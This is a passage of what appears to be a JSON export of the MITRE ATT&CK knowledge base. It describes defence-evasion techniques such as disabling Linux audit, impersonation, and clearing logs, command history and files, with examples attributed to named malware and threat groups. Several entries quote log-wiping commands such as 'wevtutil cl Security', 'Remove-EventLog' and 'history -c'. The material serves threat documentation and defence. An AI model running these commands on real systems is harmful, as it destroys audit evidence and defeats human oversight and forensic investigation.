kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.", "detailed_description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\nOften referred to as auditd, this is the name of the daemon used to write events to disk and is governed by the parameters set in the audit.conf configuration file. Two primary ways to configure the log generation rules are through the command line auditctl utility and the file /etc/audit/audit.rules,  containing a sequence of auditctl commands loaded at boot time.\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with auditd daemon or use systemctl to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the /etc/audit/audit.rules or audit.conf files to ignore malicious activity.", "id": "T1562.012", "examples": [{"id": "S0377", "name": "Ebury", "description": "Ebury disables OpenSSH, system (systemd), and audit logs (/sbin/auditd) when the backdoor is active."}]}]}, {"name": "Impersonation", "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing for Information, Phishing, or Internal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims.", "detailed_description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing for Information, Phishing, or Internal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims.\nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables Financial Theft.\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as payment, request, or urgent to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\nImpersonation is typically preceded by reconnaissance techniques such as Gather Victim Identity Information and Gather Victim Org Information as well as acquiring infrastructure such as email domains (i.e. Domains) to substantiate their false identity.\nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may Compromise Accounts targeting one organization which can then be used to support impersonation against other entities.", "id": "T1656", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 impersonated an employee at a video game developer company to send phishing emails."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has called victims' help desk and impersonated legitimate users with previously gathered information in order to gain access to privileged accounts."}, {"id": "S1131", "name": "NPPSPY", "description": "NPPSPY creates a network listener using the misspelled label logincontroll recorded to the Registry key HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group impersonated HR hiring personnel through LinkedIn messages and conducted interviews with victims in order to deceive them into downloading malware."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear has impersonated government and related entities in both phishing activity and developing web sites with malicious links that mimic legitimate resources."}, {"id": "G1015", "name": "Scattered Spider", "description": "During C0027, Scattered Spider impersonated legitimate IT personnel in phone calls and text messages either to direct victims to a credential harvesting site or getting victims to run commercial remote monitoring and management (RMM) tools.Scattered Spider utilized social engineering to compel IT help desk personnel to reset passwords and MFA tokens."}], "sub_techniques": []}, {"name": "Indicator Removal", "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.", "detailed_description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.", "id": "T1070", "examples": [{"id": "G1023", "name": "APT5", "description": "APT5 has used the THINBLOOD utility to clear SSL VPN log files located at /home/runtime/logs."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot deletes all artifacts associated with the malware from the infected machine."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has removed the watermark associated with enabling the TESTSIGNING boot configuration option by removing the relevant strings in the user32.dll.mui of the system."}, {"id": "S1161", "name": "BPFDoor", "description": "BPFDoor clears the file location /proc/<PID>/environ removing all environment variables for the process."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader has the ability to remove values it writes to the Registry."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors cleared logs to remove traces of their activity and restored compromised systems to a clean state to bypass manufacturer mitigations for CVE-2023-46805 and CVE-2024-21887."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can uninstall malicious components from the Registry, stop processes, and clear the browser history."}, {"id": "S0695", "name": "Donut", "description": "Donut can erase file references to payloads in-memory after being reflectively loaded and executed."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP restores the .text section of compromised DLLs after malicious code is loaded into memory and before the file is closed."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM has a function called \"DeleteLeftovers\" to remove certain artifacts of the attack."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can close specific Windows Security and Internet Explorer dialog boxes to mask external connections."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream has the ability to clean traces of malware deployment."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can disable pop-up information about folders and desktop items and delete Registry keys to hide malicious services."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can delete various registry keys related to its execution and use."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has restored malicious KernelCallbackTable code to its original state after the process execution flow has been hijacked."}, {"id": "S0449", "name": "Maze", "description": "Maze has used the \"Wow64RevertWow64FsRedirection\" function following attempts to delete the shadow volumes, in order to leave the system in the same state as it was prior to redirection."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has a command to delete a Registry key it uses, \\Software\\Microsoft\\Internet Explorer\\notes."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper uses a batch script to clear file system cache memory via the ProcessIdleTasks export in advapi32.dll as an anti-analysis and anti-forensics technique."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor can clear the browser history on a compromised host by changing the ClearBrowsingHistoryOnExit value to 1 in the HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Privacy Registry key."}, {"id": "S0229", "name": "Orz", "description": "Orz can overwrite Registry settings to reduce its visibility on the victim."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can clear a memory blog in the process by overwriting it with junk bytes."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to delete created WMI objects to evade detections."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to clean up and remove data structures from a compromised host."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has deleted arbitrary Registry values."}, {"id": "S0589", "name": "Sibot", "description": "Sibot will delete an associated registry key if a certain server response is received."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can remove artifacts from the compromised host, including created Registry keys."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet can delete OLE Automation and SQL stored procedures used to store malicious payloads."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST removed HTTP proxy registry values to clean up traces of execution."}], "sub_techniques": [{"name": "Clear Windows Event Logs", "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.", "detailed_description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\nWith administrator privileges, the event logs can be cleared with the following utility commands:\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command Remove-EventLog -LogName Security to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.\nAdversaries may also attempt to clear logs by directly deleting the stored log files within C:\\Windows\\System32\\winevt\\logs\\.", "id": "T1070.001", "examples": [{"id": "S1133", "name": "Apostle", "description": "Apostle will attempt to delete all event logs on a victim machine following file wipe activity."}, {"id": "G0007", "name": "APT28", "description": "APT28 has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security."}, {"id": "G0050", "name": "APT32", "description": "APT32 has cleared select event log entries."}, {"id": "G0082", "name": "APT38", "description": "APT38 clears Window Event logs and Sysmon logs from the system."}, {"id": "G0096", "name": "APT41", "description": "APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda clears Windows Event Logs following activity to evade defenses."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can clear Windows event logs using wevtutil.exe."}, {"id": "S0089", "name": "BlackEnergy", "description": "The BlackEnergy component KillDisk is capable of deleting Windows Event Logs."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has cleared event logs on compromised hosts."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has cleared Windows event logs and other logs produced by tools they used, including system, security, terminal services, remote services, and audit logs. The actors also deleted specific Registry keys."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can delete infected system log information."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has cleared event logs from victims."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has cleared logs during post compromise cleanup activities."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher clears the system event logs using  OpenEventLog/ClearEventLog APIs ."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT is able to wipe event logs."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can overwrite the C:\\Windows\\System32\\winevt\\Logs file on a targeted system."}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard has the ability to use wevtutil cl system to clear event logs."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can clear all system event logs."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used Cobalt Strike to empty log files. Additionally, Indrik Spider has cleared all event logs using wevutil."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk deletes Application, Security, Setup, and System Windows Event Logs."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can clear and remove event logs."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can delete Windows Event logs by invoking the OpenEventLogW and ClearEventLogW functions."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can use Wevtutil to remove Security, System and Application Event Viewer logs."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper removes Windows event logs during execution."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya uses wevtutil to clear the Windows event logs."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer will attempt to clear the System and Security event logs using wevtutil."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, the threat actors deleted all Windows system and security event logs using /Q /c wevtutil cl system and /Q /c wevtutil cl security."}, {"id": "G1040", "name": "Play", "description": "Play has used tools to remove log files on targeted systems."}, {"id": "S0192", "name": "Pupy", "description": "Pupy has a module to clear event logs with PowerShell."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT contains code to clear event logs."}, {"id": "S0242", "name": "SynAck", "description": "SynAck clears event logs."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of intrusion activity."}, {"id": "S0645", "name": "Wevtutil", "description": "Wevtutil can be used to clear system and security event logs from the system."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a command to clear system event logs."}]}, {"name": "Clear Linux or Mac System Logs", "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the /var/log/ directory. Subfolders in this directory categorize logs by their related functions, such as:", "detailed_description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the /var/log/ directory. Subfolders in this directory categorize logs by their related functions, such as:", "id": "T1070.002", "examples": [{"id": "S1016", "name": "MacMa", "description": "MacMa can clear possible malware traces such as application logs."}, {"id": "S0279", "name": "Proton", "description": "Proton removes logs from /var/logs and /Library/logs."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has cleared log files within the /var/log/ folder."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has removed system logs from /var/log/syslog."}]}, {"name": "Clear Command History", "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.", "detailed_description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\nAdversaries may delete their commands from these logs by manually clearing the history (history -c) or deleting the bash history file rm ~/.bash_history.\nAdversaries may also leverage a Network Device CLI on network devices to clear command history data (clear logging and/or clear history).\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the PSReadLine module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\nThe PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.\nAdversaries may run the PowerShell command Clear-History to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the ConsoleHost_history.txt file. Adversaries may also delete the ConsoleHost_history.txt file or edit its contents to hide PowerShell commands they have run.", "id": "T1070.003", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 attempted to remove evidence of some of its activity by deleting Bash histories."}, {"id": "G1023", "name": "APT5", "description": "APT5 has cleared the command history on targeted ESXi servers."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda cleared command history in Linux environments to remove traces of activity after operations."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has used history -c to clear script shell logs."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos can remove all command history on compromised hosts."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has routinely deleted log files on a compromised router, including automatic log deletion through the use of the logrotate utility."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has removed mailbox export requests from compromised Exchange servers."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used Wevtutil to remove PowerShell execution logs."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has cleared command history with history -c."}]}, {"name": "File Deletion", "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.", "detailed_description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.", "id": "T1070.004", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after FONTCACHE.DAT, rundll32.exe, and the associated .lnk file is delivered. "}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL can delete files and directories."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can self delete its dropper after the malware is successfully deployed."}, {"id": "S1133", "name": "Apostle", "description": "Apostle writes batch scripts to disk, such as system.bat and remover.bat, that perform various anti-analysis and anti-forensic tasks, before finally deleting themselves at the end of execution. Apostle attempts to delete itself after encryption or wiping operations are complete and before shutting down the victim machine."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has deleted the MSI file after installation."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can delete files from a compromised host after they are exfiltrated."}, {"id": "G0026", "name": "APT18", "description": "APT18 actors deleted tools and batch files from victim systems."}, {"id": "G0007", "name": "APT28", "description": "APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used SDelete to remove artifacts from victim networks."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that can delete files."}, {"id": "G0050", "name": "APT32", "description": "APT32's macOS backdoor can receive a \"delete\" command."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used malware to delete files after they are deployed on a compromised host."}, {"id": "G0096", "name": "APT41", "description": "APT41 deleted files from the system."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST deleted various artifacts from victim systems following use."}, {"id": "G1023", "name": "APT5", "description": "APT5 has deleted scripts and web shells to evade detection."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has deleted malicious executables from compromised machines."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to delete files and directories on compromised hosts."}, {"id": "S0438", "name": "Attor", "description": "Attor\u2019s plugin deletes the collected files and log files after exfiltration."}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred can delete files from the system."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can delete files from victim machines."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has cleaned up all files associated with the secondary payload execution."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has the ability to remove files and folders related to previous infections."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea contains a cleanup module that removes traces of itself from the victim."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH has the ability to delete PowerShell scripts from a compromised machine."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has a command to delete a file."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can delete its loader using a batch file in the Windows temporary folder."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT can delete files and directories."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal will delete its dropper and VBS scripts from the victim\u2019s machine."}, {"id": "S0069", "name": "BLACKCOFFEE", "description": "BLACKCOFFEE has the capability to delete files."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has deleted itself and associated artifacts from victim machines."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can uninstall itself."}, {"id": "S1161", "name": "BPFDoor", "description": "After initial setup, BPFDoor's original execution process deletes the dropped binary and exits."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "The BRONZE BUTLER uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can uninstall its loader through the use of a Sdl command."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them."}, {"id": "S0274", "name": "Calisto", "description": "Calisto has the capability to use rm -rf to remove folders and files from the victim's machine."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak has a command to delete files."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can uninstall itself, including deleting its executable."}, {"id": "S0462", "name": "CARROTBAT", "description": "CARROTBAT has the ability to delete downloaded files from a compromised host."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can delete files and folders from compromised machines."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can delete created files from a compromised system."}, {"id": "S0107", "name": "Cherry Picker", "description": "Recent versions of Cherry Picker delete files and registry keys created by the malware."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has performed file deletion to evade detection."}, {"id": "S0106", "name": "cmd", "description": "cmd can be used to delete files from the file system."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER removes files from victim environments following use in multiple instances."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group deleted the DLL dropper from the victim\u2019s machine to cover their tracks."}, {"id": "S0115", "name": "Crimson", "description": "Crimson has the ability to delete files from a compromised host."}, {"id": "S0498", "name": "Cryptoistic", "description": "Cryptoistic has the ability delete files from a compromised host."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader has the ability to self delete."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can use the command cmd.exe /c del to delete its artifacts from the system."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors deleted /tmp/test1.txt on compromised Ivanti Connect Secure VPNs which was used to hold stolen configuration and cache files."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can delete its configuration file after installation."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has been observed deleting its original launcher after installation."}, {"id": "S0354", "name": "Denis", "description": "Denis has a command to delete files from the victim\u2019s machine."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub can delete specific files from a compromised host."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can remove its persistence and delete itself."}, {"id": "S0062", "name": "DustySky", "description": "DustySky can delete files it creates from the infected system."}, {"id": "S0593", "name": "ECCENTRICBANDWAGON", "description": "ECCENTRICBANDWAGON can delete log files generated from the malware stored at C:\\windows\\temp\\tmp0207."}, {"id": "S0081", "name": "Elise", "description": "Elise is capable of launching a remote shell on the host to delete itself."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear deletes files related to lateral movement to avoid detection."}, {"id": "S0091", "name": "Epic", "description": "Epic has a command to delete a file from the machine."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has deleted the initial dropper after running through the environment checks."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has deleted files used during infection."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux can uninstall its persistence mechanism and delete its configuration file."}, {"id": "S0181", "name": "FALLCHILL", "description": "FALLCHILL can delete malware and associated artifacts from the victim."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can secure delete its DLL."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT deletes the .LNK file from the startup directory as well as the dropper components."}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious can delete files from a compromised host."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has used batch scripts and scheduled tasks to delete critical system files."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 uses SDelete to clean up the environment and attempt to prevent detection."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has removed files from victim machines."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has deleted tmp and prefetch files during post compromise cleanup activities. FIN8 has also deleted PowerShell scripts to evade detection on compromised machines."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy can execute batch scripts to delete files."}, {"id": "S0277", "name": "FruitFly", "description": "FruitFly will delete files on the system."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can delete files including its dropper component."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis has the ability to delete files."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group tools can delete files used during an operation."}, {"id": "S0168", "name": "Gazer", "description": "Gazer has commands to delete files and persistence mechanisms from the victim."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can delete its dropper component from the targeted system."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has the capability to to delete files."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon deletes one of its files, 2.hwp, from the endpoint after establishing persistence."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy's uninstaller can delete registry entries, files and folders, and finally itself once these tasks have been completed."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can delete .LNK files created in the Startup folder."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can delete the original executable after initial installation in addition to unused functions."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy can securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can delete old binaries on a compromised host."}, {"id": "G0043", "name": "Group5", "description": "Malware used by Group5 is capable of remotely deleting files from victims."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader can delete its executable from the AppData\\Local\\Temp directory on the compromised host."}, {"id": "S0151", "name": "HALFBAKED", "description": "HALFBAKED can delete a specified file."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has deleted files using the VBA kill function."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL has the ability to delete files."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to overwrite its own file with random bites."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor has the ability to delete folders and files from a targeted system."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor deletes its RAT installer file as it executes its DLL payload file."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has deleted scripts after execution."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to clean up installed files, delete files, and delete itself from the victim\u2019s machine."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser deletes its original installer file once installation is complete."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a backdoor through which remote attackers can delete files."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has the ability to delete a specified file."}, {"id": "S1022", "name": "IceApple", "description": "IceApple can delete files and directories from targeted systems."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has deleted files related to its dynamic debugger feature."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has uninstalled tools from compromised endpoints after use."}, {"id": "S0259", "name": "InnaputRAT", "description": "InnaputRAT has a command to delete files."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has deleted files and directories including XML and files successfully uploaded to C2 servers."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can delete itself when given the appropriate command."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe has a command to delete a file from the machine."}, {"id": "S0044", "name": "JHUHUGIT", "description": "The JHUHUGIT dropper can delete itself from the victim. Another JHUHUGIT variant has the capability to delete specified files."}, {"id": "S0201", "name": "JPIN", "description": "JPIN's installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running."}, {"id": "S0283", "name": "jRAT", "description": "jRAT has a function to delete files from the victim\u2019s machine."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar can delete files."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can delete files created on the victim's machine."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE has the capability to delete files off the victim\u2019s machine."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk has the ability to quit and delete itself."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has deleted the exfiltrated data on disk after transmission. Kimsuky has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk."}, {"id": "S0437", "name": "Kivars", "description": "Kivars has the ability to uninstall malware from the infected host."}, {"id": "S0162", "name": "Komplex", "description": "The Komplex trojan supports file deletion."}, {"id": "S0356", "name": "KONNI", "description": "KONNI can delete files."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity removes on-disk copies of tools and other artifacts after it the primary botnet payload has been loaded into memory on the victim device."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has the ability to delete itself."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware has deleted files in various ways, including \"suicide scripts\" to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron has a function to delete files."}, {"id": "S0211", "name": "Linfo", "description": 